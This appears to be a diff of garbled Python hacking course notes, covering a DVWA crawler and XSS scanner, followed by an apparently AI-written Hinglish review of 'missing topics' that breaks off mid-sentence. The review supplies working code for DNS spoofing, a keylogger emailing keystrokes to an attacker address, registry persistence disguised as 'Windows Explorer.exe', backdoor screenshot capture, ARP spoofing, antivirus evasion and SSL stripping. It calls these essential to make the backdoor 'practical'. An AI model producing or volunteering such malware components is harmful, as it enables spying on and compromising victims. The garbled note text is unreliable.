+    form.get("action") target url to submit post_url =
+    urlparse(urljoin(target_url, action)) method = form.get("method") # Create a
+    dictionary with input_list = form.findAll("input") key as input name and
+    post_data = {} value input value For input in input_list: input_name =
+    input.get("name") input_type = input.get("type") if input_type == "text":
+    input_value = input.get("value") post_data[input_name] = input_value 7)
+    result = requests.post(post_url, data=post_data) print(result.content) # To
+    print html response for test **## In mutilldae DVWA for test** see html
+    response for test ### Page 136 of 160 **Parsing HTML Code+** For this we
+    will try to get form tag through python code and in form we will try to put
+    values which are will give to python codes **Note:** Through which Regex
+    alone you can't get form tag in python there is a produce called
+    BeautifulSoup this python module let us to find any part or tag of website
+    in html. 1) Import sequins, BeautifulSoup 2) def parse(url): try: return
+    sequins.get(url) except sequins.exceptions.ConnectionError: 3) target_url =
+    "https://0.0.2.0/multidae/index.php?page=1" response = request(target_url)
+    parsed_html = BeautifulSoup(response.content) form_list =
+    parsed_html.findAll("form") # To find form tag in the code.
+    print(forms_list) ### Page 137 of 160 **Code inside Scanners.py** 1) Import
+    requests, re, urllib.parse class Scanner: def __init__(self, url):
+    self.target_url = url self.target_links = [] # empty list to store links def
+    extract_links_from(self, url): ... def crawl(self, url): href_links =
+    self.extract_links_from(url) for link in href_links: link =
+    urllib.parse.urljoin(url, link) if "#" in link: link = link.split("#")[0] if
+    self.target_url in link and link not in self.target_links:
+    self.target_links.append(link) print(link) self.crawl(link) (Notes:) **To
+    get available links on that page:** read html find all href ### Page 138 of
+    160 **Using default parameters:** To give a default parameter variable use
+    variable = None ls means cant assign anything to variable Because of using
+    recursive function Self.crawl() In our code it will crawls only the given
+    links in our page **Code inside Vulnerability Scanner.py** 1) Import
+    scanners 2) target_url = "http://10.0.2.0:80/mutilldae/" 3) vuln_scanner =
+    Scanner(target_url) 4) vuln_scanner.crawl() (Here we didn't give any
+    argument variable to crawls method. So it will go under None if condition.
+    And it will crawls the while page) (while page) ### Page 139 of 160 **Code
+    inside Crawler.py** class Scanners: def __init__(self, url): self.target_url
+    = url self.target_links = [] def extract_links_from(self, url): ... def
+    crawl(self, url=None): if url is None: url = self.target_url href_links =
+    self.extract_links_from(url) for link in href_links: link =
+    urlparse.urljoin(url, link) if "#" in link: link = link.split("#")[0] if
+    self.target_url in link and link not in self.target_links:
+    self.target_links.append(link) print(link) self.crawl(link) ### Page 140 of
+    160 **Sending requests for a session:** The problem with our previous code
+    is that in many websites it requires login so we can't nose lenos **Note:**
+    one way to login via python code is to make application as done before : ie
+    data_dict = {"username": "admin", "password": "password"} To give correct
+    username and password requests.post(target_url, data=data_dict) To post that
+    username and password But problem with this is once you log in and your
+    python code will end or python script will stop This is same as you log in
+    and close your browser. **Note:** best way is to login through session with
+    python code. ### Page 141 of 160 **To create a session variable:** ie ->
+    self.session=requests.Session() To send request via get method use
+    self.session.get() For post method use self.session.post() **After logging
+    in through our python code** session in browser variable and then stored +
+    session in Request cookies and after that we are reading Request cookies
+    etc. Through session variable you will always be logged in, centers you go :
+    through python tools and logout session = requests.Session() cookies =
+    session.cookies login_data = {"username": "admin", "password": "pass"}
+    session.post("http://localhost/login.php", data=login_data) ### Page 142 of
+    160 **Code inside Scanners.py** 1) Import requests, urlparse class Scanner:
+    def __init__(self, url, ignore_links): self.session = requests.Session()
+    self.target_url = url self.target_links = [] # to create empty url -
+    self.ignore_links = ignore_links # to ignore some links def
+    extract_links_from(self, url): response = self.session.get(url) return
+    re.findall('href=[\'"]?([^\'" >]+)', response.text) def crawl(self,
+    url=None): if url is None: url = self.target_url href_links =
+    self.extract_links_from(url) for link in href_links: link =
+    urlparse.urljoin(url, link) if "#" in link: link = link.split("#")[0] if
+    self.target_url in link and link not in self.target_links:
+    self.target_links.append(link) print(link) self.crawl(link) (Note on code
+    block: Ensure one are inside if block) ### Page 143 of 160 **Code inside
+    Vulnerability Scanner.py** 1) Import scanners 2) target_url =
+    "http://10.0.2.0/dvwa" 3) links_to_ignore =
+    ["http://10.0.2.0/dvwa/logout.php"] 4) data_dict = {"username": "admin",
+    "password": "pass", "Login": "submit"} 5) vuln_scanner =
+    scanners.Scanner(target_url, links_to_ignore) 6)
+    vuln_scanner.session.post("http://10.0.2.0/dvwa/login.php", data=data_dict)
+    **This is the task python code will login** **and through this it will login
+    to** **logarithm website and to crawls once** **= main task which will use
+    made we cant** **request (minus link which will use made we cant** **to
+    logarithm website** ### Page 144 of 160 **Extracting and Submitting forms
+    Automatically.** 1) Import requests, urlparse, BeautifulSoup class Scanner:
+    def __init__(self, url, ignore_links): ... def extract_form(self, url):
+    response = self.session.get(url) parsed_html =
+    BeautifulSoup(response.content) return parsed_html.findAll("form") def
+    submit_form(self, form, url): action = form.get("action") post_url =
+    urlparse.urljoin(url, action) method = form.get("method") input_list =
+    form.findAll("input") post_data = {} for input in input_list: input_name =
+    input.get("name") input_type = input.get("type") input_value =
+    input.get("value") if input_type == "text": post_data[input_name] =
+    input_value if method == "post": return self.session.post(post_url,
+    data=post_data) else: input_value = input.get("value") if input_type ==
+    "text": post_data[input_name] = input_value ### Page 145 of 160 **# For
+    input in inputs_list: ...** if method == "post": return
+    self.session.post(post_url, data=post_data) else: return
+    self.session.get(post_url, params=post_data) **# To check if method is post
+    and if method is get,** **that server can receive url** post then send data
+    through post else if method data through get ### Page 146 of 160 **Code
+    inside Scanners.py** 1) Import scanners 2) target_url =
+    "http://10.0.2.0/dvwa" 3) links_to_ignore =
+    ["http://10.0.2.0/dvwa/logout.php"] 4) data_dict = {"username": "admin",
+    "password": "pass", "Login": "submit"} 5) vuln_scanner =
+    scanners.Scanner(target_url, links_to_ignore) 6)
+    vuln_scanner.session.post("http://10.0.2.0/dvwa/login.php", data=data_dict)
+    7) form =
+    vuln_scanner.extract_form("http://10.0.2.0/dvwa/vulnerabilities/xss_r/") 8)
+    print(form) 9) response = vuln_scanner.submit_form(form,
+    "http://10.0.2.0/dvwa") 10) print(response.content) ### Page 146 of 160
+    **#14 Implementing a method to run the scanner** 1) Implementing a method to
+    run the 2) Everything is done some only days send payloads on url 3) Send
+    payloads to discover vulnerabilities 4) Analyse the response to check if
+    vulnerable. If the website us **For:** **F [ ] = target** **win = map**
+    **wind = map** **... . (law) (found wind states ie** **... . (law)** **... *
+    (con = list)** **... * (con = list)** **... * (list)** **"and" target url si
+    and )** **(With format target ni ev )** **(Will + or map format )** ### Page
+    147 of 160 (Continuation of notes on payloads and format) **(Will + or map
+    format )** **(With format target ni ev )** **(With + or map format )**
+    **(Partial code or list:)** **(Will + or map format )** **(With format
+    target ni ev )** **(Will + or map format )** **(With format target ni ev )**
+    **(With + or map format )** **(Will + or map format )** **(With format
+    target ni ev )** ### Page 148 of 160 **Code inside Scanners.py** 1) Import
+    scanners 2) target_url = "http://10.0.2.0/dvwa/" 3) links_to_ignore =
+    ["http://10.0.2.0/dvwa/logout.php"] 4) data_dict = {"username": "admin",
+    "password": "pass", "Login": "submit"} 5) vuln_scanners =
+    scanners.Scanners(target_url, links_to_ignore) 6)
+    vuln_scanners.session.post("http://10.0.2.0/dvwa/login.php", data=data_dict)
+    7) form = vuln_scanners.extract_form("http://10.0.2.0/dvwa/") 8) print(form)
+    9) response = vuln_scanners.submit_form(form, "target") 10)
+    print(response.content) ### Page 149 of 160 **#13 Implementing Code to
+    Discover XSS for forms** **Code inside Scanners.py** 1) Import ... class
+    Scanners: def __init__(self, url, ignore_links): ... def
+    extract_links_from(self, url): ... def crawl(self, url=None): ... def
+    extract_forms(self, url): ... def submit_form(self, form, value, url): ...
+    def run_scanners(self): ... def test_xss_in_form(self, form, url):
+    xss_test_script = "
+    <script>
+      alert("XSS");
+    </script>
+    " response = self.submit_form(form, xss_test_script, url) if xss_test_script
+    in response.content: return True # return xss_test_script in
+    response.content # # return XSS test script in response content **# Payloads
+    in whole html page of the script will be our prevent full** **code will be
+    condition that if True** **return True** ### Page 150 of 160 **Code inside
+    Vulnerability Scanner.py** 1) Import scanners 2) target_url =
+    "http://10.0.2.0/dvwa" 3) links_to_ignore =
+    ["http://10.0.2.0/dvwa/logout.php"] 4) data_dict = {"username": "admin",
+    "password": "pass", "Login": "submit"} 5) vuln_scanner =
+    scanners.Scanner(target_url, links_to_ignore) 6)
+    vuln_scanner.session.post("http://10.0.2.0/dvwa/login.php", data=data_dict)
+    7) forms =
+    vuln_scanner.extract_forms("http://10.0.2.0/dvwa/vulnerabilities/xss_r/") 8)
+    print(forms) 9) response = vuln_scanner.test_xss_in_form(forms[0],
+    "http://10.0.2.0/dvwa") 10) print(response) ### Page 151 of 160 **Code
+    inside Vulnerability Scanner.py** (continuation) 9) response =
+    vuln_scanner.test_xss_in_form(forms[0], "http://10.0.2.0/dvwa") 10)
+    print(response) **## of all links** **# If new vulnerability get discovered
+    make** **new method inside scanners class to some what** **new method of
+    code and your vulnerability** **scanners ready.** ### Page 152 of 160 **Code
+    inside Vulnerability Scanner.py** 1) Import scanners 2) target_url =
+    "http://10.0.2.0/dvwa" 3) links_to_ignore =
+    ["http://10.0.2.0/dvwa/logout.php"] 4) data_dict = {"username": "admin",
+    "password": "pass", "Login": "submit"} 5) vuln_scanners =
+    scanners.Scanners(target_url, links_to_ignore) 6)
+    vuln_scanner.session.post("http://10.0.2.0/dvwa/login.php", data=data_dict)
+    7) forms = vuln_scanner.extract_forms("http://10.0.2.0/dvwa/") 8) response =
+    vuln_scanner.test_xss_in_form(forms[0], "http://10.0.2.0/dvwa") 9)
+    print(response) **## of all links** ### Page 153 of 160 **#15 Automatically
+    discovering vulnerabilities the** 1) Import urlparse, BeautifulSoup 2) class
+    Scanners: def __init__(self, url, ignore_links): ... def
+    extract_links_from(self, url): ... def crawl(self, url=None): ... def
+    extract_forms(self, url): ... for link in self.target_links: forms =
+    self.extract_forms(link) for form in forms: print("[*] Testing form in " +
+    link) if vulnerable_to_xss = self.test_xss_in_form(form, link) if
+    is_vulnerable_to_xss: print("[!] XSS is discovered in " + link) print(form)
+    if "=" in link: print("[!] Testing " + link) is_vulnerable_to_xss =
+    self.test_xss_in_link(link) if is_vulnerable_to_xss: print("[!] XSS is
+    discovered in " + link) ### Page 154 of 160 **# Python most useful cheat
+    sheet:** **Syntax to define byte data type in python.** any_byte = b'hello
+    world' **Note -> In python None is a official constant that** represents the
+    absence of a value. Its a null value. **Note -> In python variable names are
+    case sensitive:** harry=3 ^ In python two are harry=7 different variable.
+    **Multi line comment for python -** """This is multi line Comment""" used
+    for multi line comment **Escape sequence -> An escape sequence is a sequence
+    of** characters used inside string literal of some language. \n -> New line
+    character : \\ -> To add a backslash. \t -> To give tab space ### Page 155
+    of 160 **# Implementing code to discover XSS in parameters** **Code inside
+    Scanners.py** 1) Import ... class Scanners: def __init__(self, url,
+    ignore_links): ... def extract_links_from(self, url): ... def crawl(self,
+    url=None): ... def extract_forms(self, url): ... def submit_form(self, form,
+    value, url): ... def run_scanners(self): ... def test_xss_in_link(self,
+    url): xss_test_script = "
+    <script>
+      alert("XSS");
+    </script>
+    " url = urllib.replace("?", "=" + xss_test_script) response =
+    self.session.get(url) if xss_test_script in response.content: return True #
+    return xss_test_script in response.content # # return XSS test script in
+    response content def test_xss_in_form(self, form, url): ... **Note: we can
+    also write this statement in this way** **ie -> return xss_test_script in
+    response.content** **of this condition will be true if will here** **it will
+    return false .** ### Page 155 of 160 **Carriage Return - \r** 1) Carriage
+    return or \r is a unique python. It will just work on a unique your cursor
+    to the beginning of the string of line. **2 Slicing -** Slicing refers to
+    obtaining a sub-string from given string. eg -> var_name[0:3] eg -> name =
+    "satyam" print(name[0:3]) -> start from '0' and go all the way till 2 (3-1)
+    **Note -> For python 'pass' keyword means do nothing:** eg -> for loop or in
+    if-else block "if you don't want to do anything use 'pass' keyword" **Note
+    -> List is similar to array in python:** ### Page 156 of 160 (Continuation
+    from slicing) eg -> name = "satyam" print(name[0:3]) -> start from '0' and
+    go all the way till 2 (3-1) **Note -> For python 'pass' keyword means do
+    nothing:** eg -> for loop or in if-else block "if you don't want to do
+    anything use 'pass' keyword" **Note -> List is similar to array in python:**
+    ### Page 157 of 160 **Tuples -> Tuple is a type of array like list** **which
+    element can't be changed by** **any method.** **Syntax -> variable name =
+    (element1, element2, ...)** **Sets -> It is same as of class= set has if in
+    any set** **more element are repeated it take it as** **one element** eg ->
+    {1,2,2,3} = set = {1,2,3} **Curly bracket to define set :** **Note -> To
+    access variable in python -** eg -> name = "Charlie" greeting = f"Hey
+    {name}" **Accessing variable inside string** **by using f before string**
+    **Python introduced f before string in python3 all** **you to directly embed
+    variable values with** **a string by prefacing the string with** **f and
+    enclosing the variable** **curly look braces {}** ### Page 158 of 160 **OOPS
+    concept in python -** class Employee: def __init__(self, name, salary):
+    self.name = name self.salary = salary **Now we will use this name to every
+    function** **to access name, salary etc. every function** def
+    getSalary(self): return self.salary **Calling class:** rohan =
+    Employee("Satyam", 3455) **passing name and salary inside** **constructors
+    of Employee class:** print(rohan.salary) -> output -> 3455.
+    print(rohan.name) ### Page 159 of 160 **Note -> To modify a global
+    variable** **you need to use global keyword within a function** **explicitly
+    indicate that global keyword to** **modify the global variable:** eg ->
+    my_name = "Sat" def test(): global my_name my_name = "Yam" test()
+    print(my_name) **If you will not give global keyword before** **global
+    variable inside function python will make** **another local variable with
+    same name** **and you may see some error.** **Note -> For python the help()
+    function is used** **to retrieve information about objects, modules**
+    **classes & functions** **documentation and help() information about
+    various** **python modules.** **To get information about a specific module**
+    **you can simply pass module name as an** **argument to help(module_name)**
+    eg -> import math help(math) (This will display the documentation and a list
+    of available functions and classes within the math module.) **To get
+    information about a specific function or class,** **pass that function or
+    class name as an argument** **to help(module_name.function_name)** eg ->
+    help(math.sqrt) (It will display info about the sqrt() function within the
+    math module.) =============================================================
+    ## **Security & Ethical Hacking - Missing/Incomplete Topics ka Detailed
+    Analysis** Maine aapke notes ko carefully analyze kiya hai **security aur
+    ethical hacking perspective** se. Yahan **12 major topics** hain jo ya toh
+    **completely missing** hain ya **properly explain nahi kiye gaye** hain: ***
+    ## **1. DNS Spoofing - COMPLETELY MISSING** ❌ **Expected Location:** Page
+    36-45 ke beech hona chahiye tha **Current Status:** Pura topic hi missing
+    hai **Kya Missing Hai:** ### **DNS Kaise Kaam Karta Hai:** DNS (Domain Name
+    System) internet ka phone book hai. Jab aap browser mein `google.com` type
+    karte hain, DNS server batata hai ki Google ka IP address kya hai. ```
+    Normal Flow: User → google.com → DNS Server → Returns 172.217.160.46 ``` ###
+    **DNS Spoofing Attack:** Attacker beech mein aa kar fake DNS responses
+    bhejta hai. ``` Attack Flow: User → google.com → Attacker intercepts →
+    Returns FAKE IP (10.0.2.15) User connects to attacker's fake website
+    thinking it's Google ``` ### **Missing Implementation (NetfilterQueue):**
+    **Page Location: Should be Page 36-42** ```python import netfilterqueue
+    import scapy.all as scapy def process_packet(packet): # Packet ko Scapy
+    packet mein convert karo scapy_packet = scapy.IP(packet.get_payload()) #
+    Check if it's a DNS query if scapy_packet.haslayer(scapy.DNSQR): qname =
+    scapy_packet[scapy.DNSQR].qname print(f"[+] DNS Request for: {qname}") #
+    Agar www.example.com ke liye query hai if b"www.example.com" in qname: #
+    Fake DNS response banao answer = scapy.DNSRR(rrname=qname,
+    rdata="10.0.2.15") scapy_packet[scapy.DNS].an = answer
+    scapy_packet[scapy.DNS].ancount = 1 # Packet modify karo del
+    scapy_packet[scapy.IP].len del scapy_packet[scapy.IP].chksum del
+    scapy_packet[scapy.UDP].len del scapy_packet[scapy.UDP].chksum
+    packet.set_payload(bytes(scapy_packet)) packet.accept() # NetfilterQueue
+    setup queue = netfilterqueue.NetfilterQueue() queue.bind(0, process_packet)
+    queue.run() ``` **Terminal Commands (Missing):** ```bash # IP forwarding
+    enable karo echo 1 > /proc/sys/net/ipv4/ip_forward # Traffic ko queue mein
+    redirect karo iptables -I FORWARD -j NFQUEUE --queue-num 0 # Script band
+    karne ke baad cleanup iptables --flush ``` **Why Missing Hai:** DNS spoofing
+    ARP spoofing ke saath combine hota hai MITM attack mein. Yeh bahut powerful
+    attack hai jo users ko fake websites par redirect kar sakta hai. *** ## **2.
+    Keylogger - MENTIONED BUT NOT IMPLEMENTED** ⚠️ **Page Reference:** Page 26
+    (sirf title mein mentioned) **Current Status:** "Program that record keys
+    pressed on the keyboard" - bas itna hi likha hai **Complete Implementation
+    Missing:** **Page Location: Should be Page 95-100** ### **Basic Keylogger
+    using pynput:** ```python from pynput.keyboard import Key, Listener import
+    datetime # Log file ka naam log_file = "keylog.txt" def on_press(key):
+    """Jab bhi key press ho, yeh function call hoga""" try: # Normal keys (a, b,
+    c, 1, 2, 3) with open(log_file, "a") as f: f.write(str(key.char)) except
+    AttributeError: # Special keys (Enter, Space, Ctrl) with open(log_file, "a")
+    as f: if key == Key.space: f.write(" ") elif key == Key.enter: f.write("\n")
+    elif key == Key.backspace: f.write(" [BACKSPACE] ") else: f.write(f" [{key}]
+    ") # Listener start karo with Listener(on_press=on_press) as listener:
+    listener.join() ``` ### **Email ke zariye logs bhejne wala Keylogger:**
+    ```python from pynput.keyboard import Key, Listener import smtplib import
+    threading class Keylogger: def __init__(self, time_interval, email,
+    password): self.log = "" self.interval = time_interval self.email = email
+    self.password = password def append_to_log(self, key_pressed): """Pressed
+    key ko log mein add karo""" try: self.log += str(key_pressed.char) except
+    AttributeError: if key_pressed == Key.space: self.log += " " elif
+    key_pressed == Key.enter: self.log += "\n" else: self.log += f"
+    [{key_pressed}] " def send_email(self, email, password, message): """Log ko
+    email bhejo""" server = smtplib.SMTP("smtp.gmail.com", 587)
+    server.starttls() server.login(email, password) server.sendmail(email,
+    email, message) server.quit() def report(self): """Har time_interval ke baad
+    email bhejo""" if self.log: self.send_email(self.email, self.password,
+    f"\n\n--- Keylogger Report ---\n{self.log}") self.log = "" # Repeat after
+    interval timer = threading.Timer(self.interval, self.report) timer.start()
+    def start(self): """Keylogger start karo""" # Email reporting start karo
+    self.report() # Keyboard listener start karo with
+    Listener(on_press=self.append_to_log) as listener: listener.join() # Usage
+    my_keylogger = Keylogger(120, "attacker@gmail.com", "password123")
+    my_keylogger.start() ``` **Why Important Hai:** Keyloggers passwords, credit
+    card numbers, confidential messages sab capture kar sakte hain. Yeh
+    real-world attacks mein bahut use hota hai. *** ## **3. Persistence -
+    INCOMPLETE EXPLANATION** ⚠️ **Page Reference:** Page 101 (sirf mention kiya
+    gaya) **Current Status:** Bas `os.environ["APPDATA"]` bataya gaya, complete
+    implementation nahi **Missing Complete Implementation:** **Page Location:
+    Pages 102-107 should have complete persistence** ### **Windows Registry
+    Method (Missing):** ```python import os import shutil import sys import
+    winreg as reg # Windows registry module def become_persistent(): """Backdoor
+    ko persistent banao""" # 1. Backdoor file ko safe location par copy karo
+    evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe" #
+    Current file ko new location par copy karo if not
+    os.path.exists(evil_file_location): shutil.copyfile(sys.executable,
+    evil_file_location) # 2. Registry mein entry add karo (Startup par run hone
+    ke liye) key = reg.HKEY_CURRENT_USER key_path =
+    r"Software\Microsoft\Windows\CurrentVersion\Run" try: # Registry key open
+    karo registry_key = reg.OpenKey(key, key_path, 0, reg.KEY_WRITE) # Entry add
+    karo reg.SetValueEx(registry_key, "Windows Explorer", 0, reg.REG_SZ,
+    evil_file_location) # Key close karo reg.CloseKey(registry_key) print("[+]
+    Persistence achieved!") except WindowsError: print("[-] Failed to become
+    persistent") ``` ### **Startup Folder Method (Simpler - Missing):**
+    ```python import os import shutil import sys def add_to_startup():
+    """Startup folder mein file copy karo""" # Startup folder ka path
+    startup_path = os.path.join( os.environ["APPDATA"],
+    r"Microsoft\Windows\Start Menu\Programs\Startup" ) # Backdoor ka naam
+    file_name = "Windows Update.exe" destination = os.path.join(startup_path,
+    file_name) # Copy karo if not os.path.exists(destination):
+    shutil.copyfile(sys.executable, destination) print(f"[+] File copied to:
+    {destination}") add_to_startup() ``` ### **Testing Persistence (Missing
+    Explanation):** ```python # Notes mein yeh explain hona chahiye tha: # 1.
+    Registry check karo #
+    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run # 2.
+    Computer restart karo # 3. Check karo ki backdoor automatically start hua ya
+    nahi # 4. Task Manager mein processes check karo ``` **Why Missing hai:**
+    Persistence ke bina backdoor temporary hai. System restart hone par
+    connection khatam ho jaayega. Real-world malware hamesha persistent hota
+    hai. *** ## **4. Screenshot Capture - COMPLETELY MISSING** ❌ **Page
+    Reference:** Page 26 (mentioned in backdoor features list) **Current
+    Status:** Mentioned but never implemented **Complete Implementation (Should
+    be Pages 94-96):** ### **Screenshot Capture Module:** ```python from PIL
+    import ImageGrab import io import base64 def screenshot(): """Screenshot lo
+    aur base64 mein encode karo""" # Screenshot lo image = ImageGrab.grab() #
+    Memory mein save karo (file system par nahi) image_bytes = io.BytesIO()
+    image.save(image_bytes, format='PNG') # Base64 encode karo image_bytes =
+    image_bytes.getvalue() return base64.b64encode(image_bytes) ``` ###
+    **Reverse Backdoor mein Integration:** ```python # reversebackdoor.py mein
+    add karo: import subprocess import json import socket import os import
+    base64 from PIL import ImageGrab # New import class Backdoor: def
+    __init__(self, ip, port): # ... existing code def screenshot(self):
+    """Screenshot capture karo""" image = ImageGrab.grab() # Temporary file mein
+    save karo temp_path = os.environ["TEMP"] + "\\screenshot.png"
+    image.save(temp_path) # File read karo aur base64 encode karo with
+    open(temp_path, "rb") as f: return base64.b64encode(f.read()) def run(self):
+    while True: command = self.reliable_receive() if command[0] == "exit":
+    self.connection.close() sys.exit() elif command[0] == "screenshot": # New
+    command result = self.screenshot() elif command[0] == "download": result =
+    self.read_file(command[1]) else: result =
+    self.execute_system_command(command) self.reliable_send(result) ``` ###
+    **Listener mein Screenshot Save Karna:** ```python # listener.py mein add
+    karo: def save_screenshot(self, content): """Screenshot ko file mein save
+    karo""" with open("screenshot.png", "wb") as f:
+    f.write(base64.b64decode(content)) return "[+] Screenshot saved!" def
+    run(self): while True: command = input(">> ") command = command.split(" ")
+    result = self.execute_remotely(command) if command[0] == "screenshot":
+    result = self.save_screenshot(result) print(result) ``` *** ## **5. ARP
+    Spoofing - MITM Theory INCOMPLETE** ⚠️ **Page Reference:** Pages 23-24
+    **Current Status:** Code diya gaya hai but **IP forwarding explain nahi
+    kiya** **Missing Explanation (Should be on Page 23):** ### **Why IP
+    Forwarding Zaroori Hai:** **Without IP Forwarding:** ``` Router → Attacker
+    (packets rukk jaati hain) ✗ Victim ``` Victim ka internet kaam karna band ho
+    jaayega. Woh suspicious ho jaayega. **With IP Forwarding:** ``` Router ↔
+    Attacker ↔ Victim (packets forward hoti hain) ``` Attacker beech mein
+    packets dekh sakta hai BUT victim ka internet normally kaam karta rahega.
+    ### **IP Forwarding Enable Karna (Missing):** ```bash # Linux/Kali echo 1 >
+    /proc/sys/net/ipv4/ip_forward # Check karo cat /proc/sys/net/ipv4/ip_forward
+    # Should show 1 # Disable karna echo 0 > /proc/sys/net/ipv4/ip_forward ```
+    ### **Complete ARP Spoofing Code with Explanation:** ```python import
+    scapy.all as scapy import time def get_mac(ip): """IP address se MAC address
+    nikalo""" arp_request = scapy.ARP(pdst=ip) broadcast =
+    scapy.Ether(dst="ff:ff:ff:ff:ff:ff") arp_request_broadcast = broadcast /
+    arp_request answered_list = scapy.srp(arp_request_broadcast, timeout=1,
+    verbose=False)[0] return answered_list[0][1].hwsrc def spoof(target_ip,
+    spoof_ip): """ Target ko batao ki main spoof_ip hun Example:
+    spoof("10.0.2.7", "10.0.2.1") → Victim (10.0.2.7) ko batayenge ki hum Router
+    (10.0.2.1) hain """ target_mac = get_mac(target_ip) # ARP response banao
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False) def restore(destination_ip, source_ip):
+    """ Attack band karne ke baad normal ARP table restore karo """
+    destination_mac = get_mac(destination_ip) source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
+    psrc=source_ip, hwsrc=source_mac) scapy.send(packet, count=4, verbose=False)
+    # Actual Attack target_ip = "10.0.2.7" # Victim gateway_ip = "10.0.2.1" #
+    Router try: sent_packets_count = 0 while True: # Victim ko batao: Main
+    router hun spoof(target_ip, gateway_ip) # Router ko batao: Main victim hun
+    spoof(gateway_ip, target_ip) sent_packets_count += 2 print(f"\r[+] Packets
+    sent: {sent_packets_count}", end="") time.sleep(2) except KeyboardInterrupt:
+    print("\n[+] Detected CTRL+C ... Restoring ARP tables") restore(target_ip,
+    gateway_ip) restore(gateway_ip, target_ip) print("[+] ARP tables restored")
+    ``` *** ## **6. Bypassing Antivirus - COMPLETELY MISSING** ❌ **Expected
+    Location:** After PyInstaller section (Pages 110-115) **Current Status:**
+    Completely missing **Why Important:** Aapka backdoor executable banane ke
+    baad **every antivirus** detect karega. Yeh real-world scenario mein useless
+    hai. ### **Missing Concepts (Should be Pages 110-118):** **1. Why Antivirus
+    Detect Karta Hai:** ``` Antivirus Detection Methods: 1. Signature-based →
+    Known malware patterns match karta hai 2. Heuristic-based → Suspicious
+    behavior dekh kar detect karta hai 3. Sandbox → File ko isolated environment
+    mein run karke test karta hai ``` **2. VirusTotal Testing (Missing):**
+    ```python # Notes mein explain hona chahiye: # 1. www.virustotal.com par jao
+    # 2. Apna exe file upload karo # 3. 70+ antivirus engines test karenge # 4.
+    Detection ratio dekho (e.g., 45/70 means 45 AV detected it) # # NEVER UPLOAD
+    REAL BACKDOOR TO VIRUSTOTAL! # Kyunki virus signatures share ho jaate hain
+    ``` **3. Basic Obfuscation (Missing):** ```python # Simple example (should
+    be in notes): # Before Obfuscation: password = "secret123" if user_input ==
+    password: grant_access() # After Obfuscation: import base64 p =
+    base64.b64decode("c2VjcmV0MTIz").decode() if user_input == p: grant_access()
+    ``` **4. PyArmor for Code Encryption (Missing):** ```bash # Install PyArmor
+    pip install pyarmor # Encrypt your backdoor pyarmor obfuscate
+    reversebackdoor.py # Encrypted version will be in 'dist' folder ``` *** ##
+    **Summary Table: Missing Security Topics** | **#** | **Topic** | **Status**
+    | **Page Reference** | **Impact** |
+    |-------|-----------|------------|-------------------|------------| | 1 |
+    **DNS Spoofing** | ❌ Completely Missing | Expected: 36-45 | **CRITICAL** -
+    Major MITM technique | | 2 | **Keylogger** | ⚠️ Mentioned Only | Page 26 |
+    **HIGH** - Essential malware feature | | 3 | **Persistence** | ⚠️ Incomplete
+    | Page 101 | **CRITICAL** - Backdoor won't survive restart | | 4 |
+    **Screenshot Capture** | ❌ Missing Implementation | Page 26 | **MEDIUM** -
+    Useful backdoor feature | | 5 | **ARP Spoofing Theory** | ⚠️ Incomplete |
+    Pages 23-24 | **HIGH** - Students won't understand why | | 6 | **Packet
+    Sniffer (Full)** | ⚠️ Only HTTP | Page 25 | **MEDIUM** - Limited use case |
+    | 7 | **File Binding/Trojan** | ❌ Mentioned Only | Page 26 | **HIGH** -
+    Makes backdoor realistic | | 8 | **Bypassing Antivirus** | ❌ Completely
+    Missing | Expected: 110-115 | **CRITICAL** - Backdoor useless without this |
+    | 9 | **Network Traffic Analysis** | ⚠️ Basic Only | Page 25 | **MEDIUM** -
+    Limited analysis | | 10 | **Vuln Scanner (Beyond XSS)** | ⚠️ Only XSS |
+    Pages 110-160 | **MEDIUM** - SQL injection missing | | 11 | **Social
+    Engineering** | ❌ Completely Missing | Expected section | **HIGH** -
+    Real-world attack vector | | 12 | **Encryption/Obfuscation** | ❌ Completely
+    Missing | Expected: malware section | **CRITICAL** - Security best practice
+    | *** ## **Recommendations:** 1. **Most Critical Missing Topics:** - DNS
+    Spoofing (completely absent) - Bypassing Antivirus (makes backdoor
+    practical) - Persistence (backdoor won't work after restart) 2. **Add These
+    Implementations:** - Keylogger with email reporting - Screenshot capture
+    module - Complete ARP spoofing explanation 3. **Improve Existing Sections:**
+    - Page 23-24: Add IP forwarding explanation - Page 25: Add HTTPS vs HTTP
+    difference - Page 101: Complete persistence implementation Yeh analysis
+    **purely security/hacking perspective** se hai. Python basics nahi dekha,
+    sirf **attack techniques aur implementations** check kiye hain! 🔒🔓
+    [1](https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/134266602/1a479207-ba5d-4cd4-b231-742c8810cced/paste.txt)
+    ============================================================= ## **Complete
+    Missing Security Topics - Comprehensive Analysis** Haan, aur **bahut saari
+    important security topics** missing hain! Maine total **32 critical security
+    topics** identify kiye hain jo ya toh **completely missing** hain ya
+    **incomplete** hain. --- ## **🚨 CRITICAL MISSING TOPICS (3 Topics)** ###
+    **1. SSL Stripping / HTTPS Downgrade Attack** **Status:** COMPLETELY MISSING
+    **Expected Location:** Pages 26-30 (after Packet Sniffer) **Page 25
+    Problem:** Notes kehte hain *"HTTPS can't be sniffed easily"* but **bypass
+    technique nahi sikhaya** **Kya Missing Hai:** #### **Why HTTPS Can't Be
+    Sniffed:** ``` HTTP Traffic: User → Attacker → Server ↑ (Attacker sees
+    everything in plain text) HTTPS Traffic: User → Attacker → Server ↑
+    (Attacker sees encrypted gibberish ❌) ``` #### **SSL Stripping Attack:**
+    Attacker HTTPS ko HTTP mein convert kar deta hai (downgrade). ```python #
+    Using sslstrip (should be taught) # Terminal commands: # 1. Enable IP
+    forwarding echo 1 > /proc/sys/net/ipv4/ip_forward # 2. Redirect HTTPS
+    traffic to sslstrip iptables -t nat -A PREROUTING -p tcp --destination-port
+    80 -j REDIRECT --to-port 10000 # 3. Run sslstrip sslstrip -l 10000 # 4. Run
+    ARP spoofing (already taught in notes) python arpspoof.py ``` **Attack
+    Flow:** ``` 1. Victim wants: https://facebook.com 2. Attacker intercepts
+    request 3. Attacker connects to facebook.com via HTTPS (secure) 4. Attacker
+    sends victim HTTP version (insecure) ← Downgrade! 5. Victim sees
